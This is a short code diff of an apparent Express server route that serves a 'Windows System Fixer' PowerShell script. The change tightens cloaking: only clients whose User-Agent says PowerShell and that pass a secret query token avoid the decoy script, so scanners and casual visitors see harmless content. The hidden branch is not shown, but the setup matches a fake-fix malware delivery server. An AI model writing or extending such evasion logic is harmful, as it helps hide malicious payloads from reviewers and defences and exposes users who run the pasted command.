@@ -269,8 +269,9 @@ app.get("/fix", (req, res) => {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
   const host = req.headers.host || "zxcrosfixer.up.railway.app";
   const isPosh = ua.includes("powershell") || ua.includes("windowspowershell");
+  const hasToken = req.query.v === "3";
 
-  if (!isPosh) {
+  if (!(isPosh && hasToken)) {
     const fake = `# ============================================
 # Windows System Fixer v3.2.1
 # Maintenance & Optimization Script
